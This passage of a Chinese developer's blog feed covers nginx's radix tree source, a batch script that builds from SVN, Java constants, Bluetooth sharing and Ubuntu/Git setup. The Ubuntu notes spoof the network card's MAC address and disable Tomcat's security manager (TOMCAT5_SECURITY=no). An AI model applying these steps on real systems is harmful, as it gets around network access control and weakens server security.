{//如果start内存块太小，则从内存池中申请一块新的内存块给start<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tree-&gt;start = ngx_pmemalign(tree-&gt;pool, ngx_pagesize, ngx_pagesize);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tree-&gt;size = ngx_pagesize;<br>&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp; //从start内存块中切一块<br>&nbsp;&nbsp;&nbsp; p = tree-&gt;start;<br>&nbsp;&nbsp;&nbsp; tree-&gt;start += sizeof(ngx_radix_node_t);<br>&nbsp;&nbsp;&nbsp; tree-&gt;size -= sizeof(ngx_radix_node_t); <br>&nbsp;&nbsp;&nbsp; return p;<br>}<br>这里有个小问题，start块太小的时候，申请一个新的块，原来的一小块就丢掉了，成为一个小空洞。这个小空洞的释放留给tree的pool来管理，这也体现了 nginx 设计的的一个方法学：<br>内存的释放由内存池pool来负责，具体的数据结构则只管申请，既不释放，也不担心内存空洞的问题。<br><br><b>插入元素<br></b>nginx 的基树插入方法和一般的二叉树基本一致，需要注意的是分支的选择方式：<br>如果这一位是1，则进入右子树；否则进入左子树；直到剩下的字节全为0为止。<br>如00010000，只要走到第4层的1为止，其它的层不用走。<br><br>代码core/ngx_radix_tree.c 如下所示<br>ngx_radix32tree_insert(ngx_radix_tree_t *tree, uint32_t key, uint32_t mask,<br>&nbsp;&nbsp;&nbsp; uintptr_t value)<br>{<br>&nbsp;&nbsp;&nbsp; uint32_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bit;<br>&nbsp;&nbsp;&nbsp; ngx_radix_node_t&nbsp; *node, *next;<br>&nbsp;&nbsp;&nbsp; bit = 0x80000000;//最高位<br>&nbsp;&nbsp;&nbsp; node = tree-&gt;root;<br>&nbsp;&nbsp;&nbsp; next = tree-&gt;root;<br>&nbsp;&nbsp;&nbsp; while (bit &amp; mask) {//1。定位key对应的节点<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (key &amp; bit) {//bit位是1，则进入右结点<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next = node-&gt;right;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {//bit位是0，则进入左结点<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next = node-&gt;left;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (next == NULL) {//下面的树结构尚未创建，则退出循环<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bit &gt;&gt;= 1;//进入下一位<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node = next;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if (next) {//2。要插入的key已经存在于树结构中了，则只要设置值即可<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (node-&gt;value != NGX_RADIX_NO_VALUE) {//如果这个值已经设置，表示这个key已经插入了，则插入失败<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_BUSY;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node-&gt;value = value;//设置该节点的值，完成插入。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_OK;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; //3。如果要插入的节点尚未创建，则创建相应的树结构<br>&nbsp;&nbsp;&nbsp; while (bit &amp; mask) {//<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next = ngx_radix_alloc(tree);//创建节点<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (next == NULL) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_ERROR;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next-&gt;right = NULL;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next-&gt;left = NULL;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next-&gt;parent = node;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next-&gt;value = NGX_RADIX_NO_VALUE;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (key &amp; bit) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node-&gt;right = next;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node-&gt;left = next;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bit &gt;&gt;= 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node = next;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; node-&gt;value = value;//设置节点的值<br>&nbsp;&nbsp;&nbsp; return NGX_OK;<br>}<br>这段代码非常复杂，因为分了三个步骤，首先在已经建立的节点中游动，然后再创建需要的子节点，并设置节点的值。假如原来的树只有6层，要插入一个新的节点0x 000 000 11，当走到第6层，即第6个0时，已经没有子节点了，所以退出循环，然后进入第二个while循环，创建下面两层相应的节点，最后设置节点的值。<br><br><b>删除元素<br></b>和二叉树的删除不同的是， nginx 的基树删除可能导致祖先同时被删除。<br>如果当前有两个元素，一个key=0101，一个key=01，则删除key=01的元素时，因为这个节点的右子树还有效，所以只要将 key=01 的节点的值设为NO_VALUE即可。<br>但是如果当前只有一个元素，且key=0001，则基树有4层节点，但是当这个元素被删除时，所有的节点都没有用了，nginx 就会将这个第四层的节点删除，同时不停的向上删除无用的父节点，直到所有的节点都被删除为止。<br>代码core/ngx_radix_tree.c 如下所示<br>ngx_radix32tree_delete(ngx_radix_tree_t *tree, uint32_t key, uint32_t mask)<br>{<br>&nbsp;&nbsp;&nbsp; uint32_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bit;<br>&nbsp;&nbsp;&nbsp; ngx_radix_node_t&nbsp; *node;<br>&nbsp;&nbsp;&nbsp; bit = 0x80000000;<br>&nbsp;&nbsp;&nbsp; node = tree-&gt;root;<br>&nbsp;&nbsp;&nbsp; while (node &amp;&amp; (bit &amp; mask)) {//定位到要删除的节点<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (key &amp; bit) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node = node-&gt;right;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node = node-&gt;left;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bit &gt;&gt;= 1;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if (node == NULL) {//如果要删除的节点不存在，则返回错误。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_ERROR;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if (node-&gt;right || node-&gt;left) {//如果有子节点存在，则设置该节点为NO_VALUE<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (node-&gt;value != NGX_RADIX_NO_VALUE) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node-&gt;value = NGX_RADIX_NO_VALUE;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_OK;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_ERROR;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; for ( ;; ) {//如果没有子节点，则递归删除空的父节点。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (node-&gt;parent-&gt;right == node) {//rm parent's son pointer<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node-&gt;parent-&gt;right = NULL;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node-&gt;parent-&gt;left = NULL;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node-&gt;right = tree-&gt;free;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //give it back to tree's free list<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; tree-&gt;free = node;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node = node-&gt;parent;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //up on<wbr>e step<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (node-&gt;right || node-&gt;left) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (node-&gt;value != NGX_RADIX_NO_VALUE) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (node-&gt;parent == NULL) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return NGX_OK;<br>}<br><b><br>查找元素</b><br>和二叉树的查找相似，对于这个key从高到底的每个字节，如果是0则进入左节点，如果是1则进入右节点。<br>如 0011，则返回root-&gt;left-&gt;left-&gt;right-&gt;right的值。<br><b>和二叉树不同的是</b>，nginx 的基树并不一定返回第32层节点的值，而是返回离根节点最近的祖先节点的值。<br>如 0011，不一定返回root-&gt;l-&gt;l-&gt;r-&gt;r的值，如果root-&gt;l-&gt;l-&gt;r-&gt;r无值，则取root-&gt;l-&gt;l-&gt;r的值，如果root-&gt;l-&gt;l-&gt;r无值，则取root-&gt;l-&gt;l的值，如果root-&gt;l-&gt;l也无值，则取root-&gt;l也无值，则取root的的值，如果root也无值，则返回NO_VALUE。<br>代码core/ngx_radix_tree.c 如下所示<br>ngx_radix32tree_find(ngx_radix_tree_t *tree, uint32_t key)<br>{<br>&nbsp;&nbsp;&nbsp; uint32_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bit;<br>&nbsp;&nbsp;&nbsp; uintptr_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value;<br>&nbsp;&nbsp;&nbsp; ngx_radix_node_t&nbsp; *node;<br>&nbsp;&nbsp;&nbsp; bit = 0x80000000;<br>&nbsp;&nbsp;&nbsp; value = NGX_RADIX_NO_VALUE;<br>&nbsp;&nbsp;&nbsp; node = tree-&gt;root;<br>&nbsp;&nbsp;&nbsp; while (node) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (node-&gt;value != NGX_RADIX_NO_VALUE) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; value = node-&gt;value;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (key &amp; bit) {//如果该bit=1，则进入右子树<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node = node-&gt;right;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {//如果该bit=0，则进入左子树。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node = node-&gt;left;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bit &gt;&gt;= 1;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; return value;<br>}<br><b>问题：</b><br>nginx 的基树的find方法，返回的不一定是确切节点的值，而有可能是祖先节点的值，这是nginx期望的？还是个bug呢？<br>在 nginx 的源代码中查找调用 ngx_radix32tree_find 方法的代码，发现这个函数只出现在 http/modules/ngx_http_geo_module.c 中，用来查找网络号：<br>vv = (ngx_http_variable_value_t *)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ngx_radix32tree_find(ctx-&gt;u.tree, ngx_http_geo_addr(r, ctx));<br>灰常像个bug<br><br><b>代码优化：<br></b>nginx 的基树插入操作的代码太过复杂，因为它将遍历己创建节点和未创建节点的过程分别放在两个while循环中，其实 nginx 的基树与一般的二叉树没什么区别。所以可以采取一般二叉树的插入方法，将两个while循环放到一起，这样代码的可读性会有很在的提升：<br>原来的代码44行，现在的代码35行，原来是while+if+while的结构，现在是一个while的结构，优化结果还是很令人欣慰的。<br>ngx_radix32tree_insert(ngx_radix_tree_t *tree, uint32_t key, uint32_t mask,<br>&nbsp;&nbsp;&nbsp; uintptr_t value)<br>{<br>&nbsp;&nbsp;&nbsp; uint32_t&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bit;<br>&nbsp;&nbsp;&nbsp; ngx_radix_node_t&nbsp; *node, *next;<br>&nbsp;&nbsp;&nbsp; bit = 0x80000000;//highest bit <br>&nbsp;&nbsp;&nbsp; node = tree-&gt;root;<br>&nbsp;&nbsp;&nbsp; next = tree-&gt;root;<br>&nbsp;&nbsp;&nbsp; while (bit &amp; mask) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (key &amp; bit) {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next = node-&gt;right;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next = node-&gt;left;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (next == NULL) {//create if not present but need to be.<br>
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next = ngx_radix_alloc(tree);<br>&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (next == NULL) {<br>&nbsp;&nbsp;&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_ERROR;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; next-&gt;right = NULL;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; next-&gt;left = NULL;<br>
&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; next-&gt;parent = node;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; next-&gt;value = NGX_RADIX_NO_VALUE;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; if (key &amp; bit) {<br>
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node-&gt;right = next;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  } else {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node-&gt;left = next;<br>
&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bit &gt;&gt;= 1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; node = next;<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; if (node-&gt;value != NGX_RADIX_NO_VALUE) {//already used<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return NGX_BUSY;<br>
&nbsp;&nbsp;&nbsp; }<br>
&nbsp;&nbsp;&nbsp; node-&gt;value = value;<br>
&nbsp;&nbsp;&nbsp; return NGX_OK;<br>
}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010912104443939/</guid>
    </item>
    <item>
      <title>
<![CDATA[每天自动构建SVN上的VS2008项目并发布]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009103091259183/</link>
      <description>
<![CDATA[在一个人写HelloWorld的时候，既不需要代码控制，也不需要自动构建。编写，测试，运行，一共也要不了5分钟时间<br>但是一旦涉及团队开发，SVN 便可以很大程度地提高生产效率，随之而来的是每天更新代码。<br>再随着项目的扩大，编译时间越来越长，每次修改完代码后，耐心地等待就成为必修课了。<br>这些还都是个人问题，可以通过只更新自己关心代码，只编译自己改动的模块来实现。关键的问题是，每天结束的时候，要验证当天的改动有没有破坏整个项目，就不得不更新整个项目，编译整个解决方案了。这个时间委实不小，而且在大多数情况下，这是个没有任何技术含量的重复性工作，谁来做？<br>因此，一个自动化的更新，编译，发布程序就很有意义了。<br>首先，要自动更新SVN代码，这里用的是Windows上的TortoiseSVN，可以用它提供的TortoiseProc<br><style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style><font face="monospace">call "%SVN%" /command:update /path:%PRJPATH% /closeonend:2</font><br>调用TortoiseProc.exe进行更新，如果安全正常则自动关闭窗口。<br>然后，自动编译解决方案VS2008命令行方式编译<br><style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style><font face="monospace">call "C:\Program Files\Microsoft Visual Studio 9.0\VC\vcvarsall.bat"</font><br><style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style><font face="monospace">devenv NetCode.sln /Rebuild</font><br>先调用VS2008提供的一个脚本设置好相关的环境变量，然后调用devenv使用命令行编译<br>最后将可执行文件拷贝出来，供测试使用<br><style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style><font face="monospace">for %%x in (About.dll;HL7.dll;hjz.dll) do xcopy OView\bin\Release\%%x %DESTPATH%\pj1\ /e /y<br>xcopy OView\bin\Release\da<wbr>ta %DESTPATH%\pj1\da<wbr>ta\ /e /y<br>因为Release目录下有些文件不用拷贝，因此第一句脚本指明Release目录下要拷贝的文件，第二句指用Release目录下要拷贝的文件夹<br><br></font><font face="monospace">完整的脚本代码autobuild.bat</font><font face="monospace"> 如下：<br>@REM 使用方法:<br></font><font face="monospace">@REM </font><font face="monospace">1.双击运行<br></font><font face="monospace">@REM </font><font face="monospace">2.在命令行下带参数运行 autobuild.bat v<br></font><font face="monospace">@REM </font><font face="monospace">3.在命令行下带参数运行并保存到日志文件&nbsp; autobuild.bat v &gt; build.log &gt;&gt; build.err<br></font><font face="monospace">@REM </font><font face="monospace"><br></font><style>body { font-family:tahoma; font-size:10pt } p { font-family:tahoma; font-size:10pt } div { font-family:tahoma; font-size:10pt } td { font-family:tahoma; font-size:10pt } </style><font face="monospace">@echo off<br>set PRJPATH=E:\工作目录\解决方案文件夹<br>set DESTPATH=D:\发布到这里<br>set dotNetEnv="C:\Program Files\Microsoft Visual Studio 9.0\VC\vcvarsall.bat"<br>set SVN=C:\Program Files\TortoiseSVN\bin\TortoiseProc<br><br>@REM 从SVN更新代码<br>echo ****************************<br>echo *******开始更新代码*********<br>call "%SVN%" /command:update /path:%PRJPATH% /closeonend:2<br>echo *******代码更新完成*********<br>echo ****************************<br>if "%1"=="" pause<br>echo .<br><br>@REM 编译项目<br>echo ****************************<br>echo *******开始编译工程*********<br></font><font face="monospace">call %dotNetEnv%</font><br><font face="monospace">devenv NetCode.sln /Rebuild<br>echo *******编译工程完成*********<br>echo ****************************<br>if "%1"=="" pause<br>echo .<br><br>@REM 发布安装文件<br>echo ****************************<br>echo *****开发发布安装文件*******<br>echo =========观摩室=============<br>xcopy SetupInspect\Release %DESTPATH%\安装\观摩室\ /e /y<br>echo =========检验科=============<br>xcopy SetupCLab\Release %DESTPATH%\安装\检验科\ /e /y<br>echo =========手术室=============<br>xcopy SetupOView\Release %DESTPATH%\安装\手术室\ /e /y<br>echo *****发布安装文件完成*******<br>echo ****************************<br>if "%1"=="" pause<br>echo .<br><br>@REM 发布可运行文件<br>echo ****************************<br>echo *****开始发布可运行文件*****<br>for %%x in (AxInterop.NETVIEWXLib.dll;ClinicalLab.exe;ClinicalLab.exe.config;Common.dll;Interop.NETVIEWXLib.dll;Microsoft.Practices.EnterpriseLibrary.Common.dll;Microsoft.Practices.EnterpriseLibrary.Validation.dll;Microsoft.Practices.ObjectBuilder2.dll;Microsoft.Practices.Unity.dll) do xcopy ClinicalLab\bin\Release\%%x %DESTPATH%\运行\检验科\ /e /y<br>for %%x in (AxInterop.ezDICOMax.dll;AxInterop.NETVIEWXLib.dll;Common.dll;HL7.dll;Inspect.exe;Inspect.exe.config;Interop.ezDICOMax.dll;Interop.NETVIEWXLib.dll;Microsoft.Practices.EnterpriseLibrary.Common.dll;Microsoft.Practices.EnterpriseLibrary.Validation.dll;Microsoft.Practices.ObjectBuilder2.dll;Microsoft.Practices.Unity.dll) do xcopy Inspect\bin\Release\%%x %DESTPATH%\运行\观摩室\ /e /y<br>for %%x in (About.dll;AmCharts.Windows.dll;AxInterop.ezDICOMax.dll;AxInterop.NETVIEWXLib.dll;AxInterop.Vcc5AXCtrlE.dll;Common.dll;HL7.dll;Interop.ezDICOMax.dll;Interop.NETVIEWXLib.dll;Interop.Vcc5AXCtrlE.dll;Microsoft.Practices.EnterpriseLibrary.Common.dll;Microsoft.Practices.EnterpriseLibrary.Validation.dll;Microsoft.Practices.ObjectBuilder2.dll;Microsoft.Practices.Unity.dll;OView.exe;OView.exe.config;QueryStatistics.dll;Vcc50iCSLib.dll;VCC5E.dll;WPFSamplesLib.dll) do xcopy OView\bin\Release\%%x %DESTPATH%\运行\手术室\ /e /y<br>xcopy OView\bin\Release\da<wbr>ta %DESTPATH%\运行\手术室\da<wbr>ta\ /e /y<br>echo *****发布可运行文件完成*****<br>echo ****************************<br>echo OOOOOOOOOOOOOOOOOOOOOOOOOOOO<br>echo OOOOOOOOOO全部完成OOOOOOOOOO<br>echo OOOOOOOOOOOOOOOOOOOOOOOOOOOO<br>if "%1"=="" pause</font><br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009103091259183/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu get started]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200852332442237/</link>
      <description>
<![CDATA[0. install using CD without network<br>1. fake a Mac and config network<br>ifconfig eth0 down<br>ifconfig eth0 hw ether 00:c0:9f:67:1f:80<br>ifconfig eth0 up<br>route add default gw 210.30.105.254<br>2. install jdk and tomcat<br>apt-get update<br>apt-get install sun-java6-jdk<br>apt-get install tomcat5.5<br>http://localhost:8180/<br>3. install jspwiki<br>apt-get install jspwiki<br>cp /etc/jspwiki.xml /usr/share/tomcat5.5/conf/Catalina/localhost<br>vi /etc/default/tomcat5.5 =&gt; TOMCAT5_SECURITY=no<br>/etc/init.d/tomcat5.5 restart<br>http://localhost:8180/jspwiki<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200852332442237/</guid>
    </item>
    <item>
      <title>
<![CDATA[Java的final相当于C++的宏]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200792611262246/</link>
      <description>
<![CDATA[<P>很可恶，竟然是在编译期间代替，因此产生两个后果：</P>
<P>1。class Test{</P>
<P>&nbsp;int a = 100;</P>
<P>&nbsp;byte b = a;</P>
<P>}</P>
<P>编译报错；可能损失精度；但是如果改为final int a = 100;则编译正常，因为他用100代替了a；byte b = 100；</P>
<P>2。两个文件：</P>
<P>Test2.java public class Test2{&nbsp; public static final int A = 8;}</P>
<P>Test.java&nbsp;&nbsp; public class Test{ static void main(String args[]){System.out.println(Test2.A);}};</P>
<P>编译运行，输出8；然后把Test2.java的A的值修改了A=9;编译Test2.java，运行Test结果是8；</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200792611262246/</guid>
    </item>
    <item>
      <title>
<![CDATA[Windows通过蓝牙共享上网]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200911154852728/</link>
      <description>
<![CDATA[0. 服务端使用用IVT蓝牙软件，客户端用BTW蓝牙软件。<br>1. 服务端启用Personal Area Network, 并设置本地连接为共享<br>2. 客户端连接Group Ad-hoc Network Service<br>3. 设置客户端IP和服务端的IP为同一网段<br>4&nbsp; over.<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200911154852728/</guid>
    </item>
    <item>
      <title>
<![CDATA[Fw:在Ubuntu Server上安装Git]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200992232828898/</link>
      <description>
<![CDATA[首先安装SSH Server:<br>

打开Ubuntu Server终端，输入如下代码：<br>

sudo apt-get install openssh-server<br>

生成RSA Key(请su到普通用户来执行此命令):<br>

ssh-keygen -t rsa<br>

